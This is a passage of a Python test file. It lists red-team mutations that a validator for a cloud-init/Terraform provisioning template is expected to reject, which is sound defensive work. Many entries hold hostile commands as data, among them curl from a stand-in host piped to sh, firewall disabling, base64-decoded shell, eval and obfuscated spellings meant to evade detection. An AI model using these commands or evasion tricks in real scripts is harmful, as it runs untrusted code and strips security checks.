        ("P8 jinja header before the cloud-config line", [("#cloud-config\n", "## template: jinja\n#cloud-config\n")]),
        ("P9 cyrillic look-alike chmod", [(dec, "      \u0441hmod 0644 /etc/ai-memory/store-url\n" + dec)]),
        ("P10 quote-split ch''mod", [(dec, "      ch''mod 0644 /etc/ai-memory/store-url\n" + dec)]),
        ("P11 heredoc delimiter differential", [(dec, "      cat >/dev/null <<\"EOF\"x\n      EOF\n      ufw disable\n      EOFx\n" + dec)]),
        ("P12 nft flush ruleset", [(dec, "      nft flush ruleset\n" + dec)]),
        ("P13 member symlink check under if false", [(member, "      if false; then\n" + member + "      fi\n")]),
        ("P14 home owner check under if false", [(owner, "      if false; then\n" + owner + "      fi\n")]),
        ("P15 tf directive drops the hostnossl reject", [(hba, "%{ if false }\n" + hba + "%{ endif }\n")]),
        ("P16 true before the digest check", [(sha, "      true\n" + sha)]),
        ("P17 digest check deleted", [(sha, "")]),
        ("P18 tar without the member name", [(tar_x, tar_x.replace(" ai-memory\n", "\n"))]),
        ("P19 one of two identical make install lines dropped", [(mk, "")]),
    ]
    for lbl, muts in sec:
        red("R3-S " + lbl, muts, autolist=False)
    code = [
        ("curl piped to sh", [(dec, "      curl -fsSL https://x.example/i.sh | sh\n" + dec)]),
        ("add-apt-repository, neutral argument (#4794)", [(dec, "      add-apt-repository -y ppa:someone/foo\n" + dec)]),
        ("apt-add-repository, neutral argument (#4794)", [(dec, "      apt-add-repository -y ppa:someone/foo\n" + dec)]),
        ("wget2, neutral argument (#4794)", [(dec, "      wget2 -O f example.com/x\n" + dec)]),
        ("pipx run (#4794)", [(dec, "      pipx run cowsay\n" + dec)]),
        ("AGE_COMMIT value changed", [("      AGE_COMMIT=e43dc1a12b78fba4acef9835b2b10379b8d243b4\n", "      AGE_COMMIT=e43dc1a22b78fba4acef9835b2b10379b8d243b4\n")]),
        ("store-url chmod 0640", [(CHMOD, CHMOD.replace("0600", "0640"))]),
        ("digest check made non-fatal", [(sha, sha.replace("exit 1; }", "exit 1; } || true"))]),
        ("runcmd folded scalar", [(RUNCMD, RUNCMD + "  - >\n    curl https://x.example/a\n")]),
        ("runcmd plain scalar continued", [(RUNCMD, RUNCMD + "  - echo ok\n    && curl https://x.example/a\n")]),
        ("runcmd flow list with a unicode escape hiding curl", [(RUNCMD, RUNCMD + '  - [bash, -c, "c\\u0075rl https://x.example/a"]\n')]),
        ("c backslash newline continuation", [(dec, "      c\\\n      url -o /x https://x.example/a\n" + dec)]),
        ("c quote u quote rl", [(dec, "      c'u'rl -o /x x.example/a\n" + dec)]),
        ("glob command word (#4795)", [(dec, "      /???/???/c?rl -sSo f x.example/p\n" + dec)]),
        ("regular-file check moved after the install", [(member, ""), (inst, inst + member)]),
        ("digest check wrapped in if false", [(sha, "      if false; then\n" + sha + "      fi\n")]),
        ("exit 0 before the binary download", [(curl_bin, "      exit 0\n" + curl_bin)]),
        ("approved line duplicated", [(dec, "      chmod 0600 /etc/ai-memory/store-url\n" + dec)]),
        ("shell comment inside a double-quoted multi-line string", [(dec, '      echo "a\n      # curl x\n      b"\n' + dec)]),
    ]
    for lbl, muts in code:
        red("R3-C " + lbl, muts, autolist=False)
    listed = [
        ("serve --store_url", [(unit_exec, unit_exec + " --store_url /x")]),
        ("serve unknown long flag --bind", [(unit_exec, unit_exec + " --bind 0.0.0.0:9077")]),
        ("eval in a listed line", [(dec, '      eval "echo hi"\n' + dec)]),
        ("base64 -d | bash in a listed line", [(dec, "      echo ZWNobw== | base64 -d | bash\n" + dec)]),
        ("ANSI-C quoting in a listed line", [(dec, "      echo $'\\x41'\n" + dec)]),
        ("variable in command position in a listed line", [(dec, '      X=curl; "$X" https://x.example\n' + dec)]),
        ("unit ExecStartPre sh -c eval, listed (#4793)", [(daemon_env, daemon_env + "      ExecStartPre=/bin/sh -c 'eval \"$PRE\"'\n")]),
        ("quoted heredoc with eval, listed (#4793)", [(dec, "      cat > /usr/local/bin/pre <<'EOF'\n      #!/bin/sh\n      eval \"$1\"\n      EOF\n" + dec)]),
        ("quoted heredoc with base64 -d | sh, listed (#4793)", [(dec, "      cat > /usr/local/bin/pre <<'EOF'\n      echo Y3VybA== | base64 -d | sh\n      EOF\n" + dec)]),
        ("ai-memory serve in the provision script, listed (#4837)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory serve --bind 0.0.0.0:9077\n" + dec)]),
        ("sudo -u ai-memory --db serve in the provision script, listed (#4837)", [(dec, "      sudo -u aimemory /usr/local/lib/ai-memory/bin/ai-memory --db /x serve\n" + dec)]),
        ("unit ExecStartPost runs serve, listed (#4837)", [(daemon_env, daemon_env + "      ExecStartPost=/usr/local/lib/ai-memory/bin/ai-memory serve --host 0.0.0.0 --port 9078\n")]),
        ("unit ExecStartPre runs serve, listed (#4837)", [(daemon_env, daemon_env + "      ExecStartPre=/usr/local/lib/ai-memory/bin/ai-memory serve --host 0.0.0.0 --port 9078\n")]),
        ("unit ExecReload runs serve, listed (#4837)", [(daemon_env, daemon_env + "      ExecReload=/usr/local/lib/ai-memory/bin/ai-memory serve --host 0.0.0.0 --port 9078\n")]),
        ("runcmd flow list runs serve, listed (#4837)", [(RUNCMD, RUNCMD + "  - [/usr/local/lib/ai-memory/bin/ai-memory, serve, --host, 0.0.0.0, --port, '9078']\n")]),
        ("quote-split serve in the provision script, listed (#4837 R6)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory se''rve --host 0.0.0.0\n" + dec)]),
        ("backslash-split serve in the provision script, listed (#4837 R6)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory s\\erve --host 0.0.0.0\n" + dec)]),
        ("ai-memory subcommand in a variable, listed (#4837 R6)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x "$V" --host 0.0.0.0\n' + dec)]),
        ("ai-memory under xargs, listed (#4837 R6)", [(dec, "      echo serve | xargs /usr/local/lib/ai-memory/bin/ai-memory\n" + dec)]),
        ("ai-memory subcommand in a variable after --json, listed (#4837 R7)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --json "$V" --host 0.0.0.0\n' + dec)]),
        ("ai-memory subcommand in a variable after --, listed (#4837 R7)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory -- "$V" --host 0.0.0.0\n' + dec)]),
        ("ai-memory --db=$X unquoted (word split), listed (#4837 R8)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db=$X --host 0.0.0.0\n' + dec)]),
        ("ai-memory --db $X unquoted (word split), listed (#4837 R8)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db $X --host 0.0.0.0\n' + dec)]),
        ("ai-memory --db=$(cmd) substitution, listed (#4837 R8)", [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db=$(cat /f) --host 0.0.0.0\n' + dec)]),
        ("ai-memory unquoted expansion in a --db= value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=$V --host 0.0.0.0\n" + dec)]),
        ("ai-memory unquoted command substitution mixed into a --db= value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=/x$(cat /f) --host 0.0.0.0\n" + dec)]),
        ("ai-memory literal mixed with an unquoted variable in a --db= value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=/x$V --host 0.0.0.0\n" + dec)]),
        ("ai-memory unquoted --agent-id= value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id=$V --host 0.0.0.0\n" + dec)]),
        ("ai-memory unquoted expansion as a separate --db value, listed (#4837 R8)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db $V --host 0.0.0.0\n" + dec)]),
        ("ai-memory unquoted interpolation in a --db= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=${X} stats\n" + dec)]),
        ("ai-memory unquoted interpolation as a separate --db value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db ${X} stats\n" + dec)]),
        ("ai-memory unquoted interpolation in an --agent-id= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id=${X} stats\n" + dec)]),
        ("ai-memory unquoted interpolation as a separate --agent-id value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id ${X} stats\n" + dec)]),
        ("ai-memory unquoted interpolation in a --db-passphrase-file= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db-passphrase-file=${X} stats\n" + dec)]),
        ("ai-memory unquoted interpolation as a separate --db-passphrase-file value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db-passphrase-file ${X} stats\n" + dec)]),
        ("ai-memory literal mixed with an unquoted interpolation in a --db= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=/x${X} stats\n" + dec)]),
        ("ai-memory literal mixed with an unquoted interpolation as a separate --db value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db /x${X} stats\n" + dec)]),
        ("ai-memory literal mixed with an unquoted interpolation in an --agent-id= value, listed (#4837 R10)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id=a${X}b stats\n" + dec)]),
        ("ai-memory \"${X}\" quoted terraform value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db \"${X}\" stats\n" + dec)]),
        ("ai-memory --db=\"${X}\" quoted terraform value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=\"${X}\" stats\n" + dec)]),
        ("ai-memory --agent-id \"/x/${X}\" quoted terraform value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id \"/x/${X}\" stats\n" + dec)]),
        ("ai-memory \"$${A[@]}\" array value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db \"$${A[@]}\" --host 0.0.0.0\n" + dec)]),
        ("ai-memory --db=\"$${A[@]}\" array value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db=\"$${A[@]}\" --host 0.0.0.0\n" + dec)]),
        ("ai-memory \"$${A[@]:0}\" array slice value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --agent-id \"$${A[@]:0}\" --host 0.0.0.0\n" + dec)]),
        ("ai-memory brace expansion in a separate --db value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db {/x,s}erve --host 0.0.0.0\n" + dec)]),
        ("ai-memory glob in a separate --db value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db /var/lib/ai-memory/* --host 0.0.0.0\n" + dec)]),
        ("ai-memory brace expansion in the subcommand, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db /x {s,x}erve --host 0.0.0.0\n" + dec)]),
        ("ai-memory directive-conditional quotes on a --db value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db %{ if c }\"%{ endif }$X%{ if c }\"%{ endif } --host 0.0.0.0\n" + dec)]),
        ("ai-memory for-loop directive repeats a --db value, listed (#4837 R11)", [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db \"%{ for s in l }${s}\" \"%{ endfor }\" --host 0.0.0.0\n" + dec)]),
        # #4837 R12 (round 10). A terraform value inside double quotes was green in d949c732c;
        # terraform pastes the value into the script text before bash parses it, so a value
        # holding a quote, $( or a backtick is code. The closed grammar makes all 7 red.
        ('ai-memory --db="${X}/y" quoted terraform value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db="${X}/y" stats\n' + dec)]),
        ('ai-memory --db "/x/${X}" quoted terraform value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db "/x/${X}" stats\n' + dec)]),
        ('ai-memory --agent-id="${X}" quoted terraform value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --agent-id="${X}" stats\n' + dec)]),
        ('ai-memory --agent-id "${X}" quoted terraform value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --agent-id "${X}" stats\n' + dec)]),
        ('ai-memory --db-passphrase-file="${X}" quoted terraform value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db-passphrase-file="${X}" stats\n' + dec)]),
        ('ai-memory "$${DB:-/x}" parameter operator, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db "$${DB:-/x}" stats\n' + dec)]),
        ('ai-memory "$${A[*]}" array, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db "$${A[*]}" stats\n' + dec)]),
        ('ai-memory "$${X:-a b}" operator with a space, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db "$${X:-a b}" stats\n' + dec)]),
        ('ai-memory quoted glob characters "/x/*", listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db "/x/*" stats\n' + dec)]),
        ('ai-memory single-quoted glob and brace characters, listed (#4837 R12 R1)', [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory --db '/x/*{a,b}' stats\n" + dec)]),
        ('ai-memory tilde value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db ~/x stats\n' + dec)]),
        ('ai-memory quoted variable followed by an unquoted one, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db="$${X}"$${Y} stats\n' + dec)]),
        ('ai-memory empty --db= value, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db= stats\n' + dec)]),
        ('ai-memory unknown --flag= value with an expansion, listed (#4837 R12 R1)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --json=$${X} stats\n' + dec)]),
        ('ai-memory quoted array expansion as a separate --db value, listed (#4837 R9, #4966)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db "$${A[@]}" --host 0.0.0.0\n' + dec)]),
        ('ai-memory quoted array expansion in a --db= value, listed (#4837 R9, #4966)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db="$${A[@]}" --host 0.0.0.0\n' + dec)]),
        ('ai-memory glob as a separate --db value, listed (#4837 R9, #4967)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /etc/* --host 0.0.0.0\n' + dec)]),
        ('ai-memory brace expansion as a separate --db value, listed (#4837 R9, #4967)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db {/x,stats} --host 0.0.0.0\n' + dec)]),
        ('ai-memory quoted subcommand, listed (#4837 R12 R2)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x "stats"\n' + dec)]),
        ('ai-memory subcommand after -- is quoted, listed (#4837 R12 R2)', [(dec, "      /usr/local/lib/ai-memory/bin/ai-memory -- 'stats'\n" + dec)]),
        ('ai-memory subcommand mixed with a variable, listed (#4837 R12 R2)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x st$${Y}\n' + dec)]),
        ('ai-memory standalone directive before the subcommand, listed (#4837 R12 R2)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x %{ if c } stats\n' + dec)]),
        ('reserved TFVALUE in a heredoc body, listed (#4837 R9, #4968)', [(dec, "      cat > /etc/x.sh <<'EOF'\n      $${TFVALUE} --host 0.0.0.0\n      EOF\n" + dec)]),
        ('shell TFVALUE as a command in a data heredoc, listed (#4837 R12 R3)', [(dec, "      cat > /etc/ai-memory/x.conf <<'EOF'\n      $${TFVALUE} --db /x stats\n      EOF\n" + dec)]),
        ('control character in the template, listed (#4837 R12 R3)', [(dec, '      echo a\x03b\n' + dec)]),
        ('ai-memory behind taskset, listed (#4837 R12 R4)', [(dec, '      taskset -c 0 /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
        ('ai-memory behind doas, listed (#4837 R12 R4)', [(dec, '      doas -u aimemory /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
        ('ai-memory behind time -p, listed (#4837 R12 R4)', [(dec, '      time -p /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
        ('ai-memory behind unshare, listed (#4837 R12 R4)', [(dec, '      unshare -m /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
        ('ai-memory behind prlimit, listed (#4837 R12 R4)', [(dec, '      prlimit --nofile=1024 /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
        ('ai-memory behind numactl, listed (#4837 R12 R4)', [(dec, '      numactl -N 0 /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
        ('ai-memory behind setpriv, listed (#4837 R12 R4)', [(dec, '      setpriv --reuid=aimemory /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
        ('ai-memory behind runuser without --, listed (#4837 R12 R4)', [(dec, '      runuser aimemory /usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats\n' + dec)]),
        ('ai-memory at a data-home parent behind taskset, listed (#4837 R12 R4, #5092)', [(dec, '      taskset -c 0 /opt/ai-memory --db $${X} stats\n' + dec)]),
        ('ai-memory at a data home copied to another name, listed (#4837 R12 R4, #5092)', [(dec, '      cp /etc/ai-memory /usr/local/bin/aim\n' + dec)]),
        ('ai-memory copied by a glob source to another name, listed (#4837 R12 R4, #5093)', [(dec, '      cp /usr/local/lib/ai-memory/bin/ai-mem* /usr/local/bin/aim\n' + dec)]),
        ('ai-memory installed by a ? glob source to another name, listed (#4837 R12 R4, #5093)', [(dec, '      install -m 0755 /usr/local/lib/ai-memory/bin/ai-memor? /usr/local/bin/aim\n' + dec)]),
        ('ai-memory copied with a brace operand, listed (#4837 R12 R4, #5093)', [(dec, '      cp /usr/local/lib/ai-memory/bin/ai-memory{,.real}\n' + dec)]),
        ('ai-memory copied by a brace that holds both paths, listed (#4837 R12 R4, #5093)', [(dec, '      cp {/usr/local/lib/ai-memory/bin/ai-memory,/usr/local/bin/aim}\n' + dec)]),
        ('ai-memory named by a glob behind taskset, listed (#4837 R12 R4, #5093)', [(dec, '      taskset -c 0 /usr/local/lib/ai-memory/bin/ai-mem* --db /x stats\n' + dec)]),
        ('ai-memory named by a brace behind taskset, listed (#4837 R12 R4, #5093)', [(dec, '      taskset -c 0 /usr/local/lib/ai-memory/bin/ai-{memory,x} --db /x stats\n' + dec)]),
        ('ai-memory named by a brace past 64 alternatives behind taskset, listed (#4837 R12 R4 pin, #5205)', [(dec, '      taskset -c 0 /usr/local/lib/ai-memory/bin/{' + ','.join('a%d' % i for i in range(65)) + ',x} --db /x stats\n' + dec)]),
        ('tar --transform with no binary name in sight, listed (#4837 R12 R4, #5093)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --transform s/x/aim/\n' + dec)]),
        ('tar options from a TAR_OPTIONS prefix, listed (#4837 R12 R4, #5093 R11)', [(dec, '      TAR_OPTIONS=--transform=s/x/aim/ tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
        ('tar options from an exported TAR_OPTIONS, listed (#4837 R12 R4, #5093 R11)', [(dec, '      export TAR_OPTIONS=--xform=s/x/aim/\n      tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
        ('tar options from a quote-split exported TAR_OPTIONS, listed (#4837 R12 R4, #5093 R11)', [(dec, '      export TAR_""OPTIONS=--xform=s/x/aim/\n      tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
        ('tar options from an export whose name is built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; export "$${N}IONS=--xform=s/x/aim/"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
        ('tar options from a declare -x whose name is built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      T=OPTIONS; declare -x "TAR_$T=--xform=s/x/aim/"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
        ('tar options from a local -x whose name is built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      f() { local -x "$${N}IONS=--xform=s/x/aim/"; tar -C /usr/local/bin -xf /root/b.tar; }; N=TAR_OPT; f\n' + dec)]),
        ('tar options from a readonly name built from an expansion, then exported, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; readonly "$${N}IONS=--xform"; export "$${N}IONS"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
        ('tar options from printf -v into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; printf -v "$${N}IONS" %s --xform=s/x/aim/; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
        ('tar options from read into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; read -r "$${N}IONS" <<< --xform=s/x/aim/; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
        ('tar options from mapfile into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; mapfile -t "$${N}IONS" < /dev/null; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
        ('tar options from getopts into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; getopts x "$${N}IONS"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
        ('nameref whose target is built from an expansion, alone, listed (#4837 R12 R4, #5326)', [(dec, '      T=X; declare -n R="$T"\n' + dec)]),
        ('tar options from printf -v attached to a name built from an expansion, listed (#4837 R12 R4, #5444)', [(dec, '      printf -vTAR_$T %s --to-command=sh\n' + dec)]),
        ('tar options from printf -v attached to a quoted name built from an expansion, listed (#4837 R12 R4, #5444)', [(dec, '      printf -v"TAR_$T" %s x\n' + dec)]),
        ('binary assigned as a one-element array, then run behind taskset, listed (#4837 R12 R4, #5330)', [(dec, "      A=(/usr/local/lib/ai-memory/bin/ai-memory); taskset -c 0 \"$A\" --db /x stats\n" + dec)]),
        ('binary written through a nameref whose target is built from an expansion, the store-url data line made plain so that no other rule reddens the template, listed (#4837 R12 R4, #5330)', [(DSNFILE, "postgres-url"), (dec, "      T=A; A=/usr/bin/true; declare -n R=\"$T\"; R=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 \"$A\" --db /x stats\n" + dec)]),
        ('binary written through a nameref whose target is assigned from an expansion, the store-url data line made plain so that no other rule reddens the template, listed (#4837 R12 R4, #5330)', [(DSNFILE, "postgres-url"), (dec, "      T=A; A=/usr/bin/true; declare -n R; R=$T; R=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 \"$A\" --db /x stats\n" + dec)]),
        ('tar abbreviated --transf option, listed (#4837 R12 R4, #5093)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --transf=s/x/aim/\n' + dec)]),
        ('tar shortest unambiguous --tr option, listed (#4837 R12 R4 pin, #5205)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --tr=s/x/aim/\n' + dec)]),
        ('tar s (rename pattern) in a short cluster, listed (#4837 R12 R4 pin, #5205)', [(dec, '      tar -xsf /root/b.tar -C /usr/local/bin\n' + dec)]),
        ('tar rename option spelled with quotes inside, listed (#4837 R12 R4, #5328)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --"tra"nsform=s/x/aim/\n' + dec)]),
        ('tar rename option quoted as a whole, listed (#4837 R12 R4, #5328)', [(dec, "      tar -C /usr/local/bin -xf /root/b.tar '--transform=s/x/aim/'\n" + dec)]),
        ('tar long option whose name is an expansion, listed (#4837 R12 R4, #5328)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --$${X}\n' + dec)]),
        ('tar short cluster holding an expansion, listed (#4837 R12 R4, #5328)', [(dec, '      tar -C /usr/local/bin -x$${F}f /root/b.tar\n' + dec)]),
        ('tar operand that expands to a rename option, listed (#4837 R12 R4, #5328)', [(dec, '      O=--transform=s/x/aim/; tar -C /usr/local/bin -xf /root/b.tar $O\n' + dec)]),
        ('tar --rename option, listed (#4837 R12 R4, #5093)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --rename=s/x/aim/\n' + dec)]),
        ('tar program option in a short cluster, listed (#4837 R12 R4, #5093)', [(dec, '      tar -xvIsh -f /x.tar\n' + dec)]),
        ('tar program option in the dashless first argument, listed (#4837 R12 R4, #5093)', [(dec, '      tar xIf gzip /x.tar\n' + dec)]),
        ('tar abbreviated --to-com option, listed (#4837 R12 R4, #5093)', [(dec, '      tar -xf /x.tar --to-com=/usr/local/bin/x\n' + dec)]),
        ('find -exec copies its match, listed (#4837 R12 R4, #5093)', [(dec, '      find /usr/local/lib -type f -exec cp {} /usr/local/bin/aim \\;\n' + dec)]),
        ('cp under xargs, listed (#4837 R12 R4, #5093)', [(dec, '      ls /usr/local/lib/ai-memory/bin | xargs -I{} cp {} /usr/local/bin/aim\n' + dec)]),
        ('ai-memory found by command -v behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      B=$(command -v ai-memory); taskset -c 0 "$${B}" --db /x stats\n' + dec)]),
        ('ai-memory through a variable alias behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      B=/usr/local/lib/ai-memory/bin/ai-memory; C="$${B}"; taskset -c 0 "$${C}" --db /x stats\n' + dec)]),
        ('ai-memory through a variable operator behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      B=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$${B%.x}" --db /x stats\n' + dec)]),
        ('ai-memory copied through a variable operator, listed (#4837 R12 R4 pin, #5205)', [(dec, '      B=/usr/local/lib/ai-memory/bin/ai-memory; cp "$${B%x}" /usr/local/bin/aim\n' + dec)]),
        ('ai-memory through a default operator behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      taskset -c 0 $${AIM:-/usr/local/lib/ai-memory/bin/ai-memory} --db /x stats\n' + dec)]),
        ('ai-memory named by a partial expansion behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      taskset -c 0 /usr/local/lib/ai-memory/bin/$${N} --db /x stats\n' + dec)]),
        ('ai-memory through a for-loop variable behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      for f in /usr/local/lib/ai-memory/bin/*; do taskset -c 0 "$f" --db /x stats; done\n' + dec)]),
        ('read variable run behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      read X < /etc/x; taskset -c 0 "$${X}" --db /x stats\n' + dec)]),
        ('substitution run behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      taskset -c 0 "$(cat /etc/x)" --db /x stats\n' + dec)]),
        ('indirect expansion run behind taskset, listed (#4837 R12 R4, #5094 R11)', [(dec, '      B=/usr/local/lib/ai-memory/bin/ai-memory; N=B; taskset -c 0 "$${!N}" --db /x stats\n' + dec)]),
        ('nameref run behind taskset, listed (#4837 R12 R4, #5094 R11)', [(dec, '      B=/usr/local/lib/ai-memory/bin/ai-memory; declare -n R=B; taskset -c 0 "$R" --db /x stats\n' + dec)]),
        ('array element run behind taskset, listed (#4837 R12 R4, #5094 R11)', [(dec, '      A=(/usr/local/lib/ai-memory/bin/ai-memory); taskset -c 0 "$${A[0]}" --db /x stats\n' + dec)]),
        ('append-built name run behind taskset, listed (#4837 R12 R4, #5094 R11)', [(dec, '      C=/usr/local/lib/ai-memory/bin/ai-; C+=memory; taskset -c 0 "$C" --db /x stats\n' + dec)]),
        ('glob value run unquoted behind taskset, listed (#4837 R12 R4, #5094 R11)', [(dec, '      C="/usr/local/lib/ai-memory/bin/ai-mem*"; taskset -c 0 $C --db /x stats\n' + dec)]),
        ('unassigned variable run behind taskset, listed (#4837 R12 R4, #5094)', [(dec, '      taskset -c 0 "$${UNSET}" --db /x stats\n' + dec)]),
        ('resolved name through a default operator behind taskset, listed (#4837 R12 R4, #5173)', [(dec, '      A=; taskset -c 0 "$${A:-/usr/local/lib/ai-memory/bin/ai-memory}" --db /x stats\n' + dec)]),
        ('resolved name through a pattern operator behind taskset, listed (#4837 R12 R4, #5173)', [(dec, '      A=/usr/local/lib/ai-memory/bin/ai-memorx; taskset -c 0 "$${A/x/y}" --db /x stats\n' + dec)]),
        ('resolved name through a case operator behind taskset, listed (#4837 R12 R4, #5173)', [(dec, '      A=/usr/local/lib/ai-memory/bin/AI-MEMORY; taskset -c 0 "$${A,,}" --db /x stats\n' + dec)]),
        ('nameref declared before its target behind taskset, listed (#4837 R12 R4, #5174)', [(dec, '      declare -n R=A; A=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$R" --db /x stats\n' + dec)]),
        ('target written through a nameref behind taskset, listed (#4837 R12 R4, #5174)', [(dec, '      A=/usr/bin/true; declare -n R; R=A; R=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$A" --db /x stats\n' + dec)]),
        ('nameref whose target is an expansion behind taskset, listed (#4837 R12 R4, #5174)', [(dec, '      T=A; A=/usr/local/lib/ai-memory/bin/ai-memory; declare -n R="$T"; taskset -c 0 "$R" --db /x stats\n' + dec)]),
        ('nameref declared by a quoted builtin name behind taskset, listed (#4837 R12 R4, #5323)', [(dec, '      "declare" -n R=A; A=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$R" --db /x stats\n' + dec)]),
        ('nameref declared by an escaped builtin name behind taskset, listed (#4837 R12 R4, #5323)', [(dec, '      d\\eclare -n R=A; A=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$R" --db /x stats\n' + dec)]),
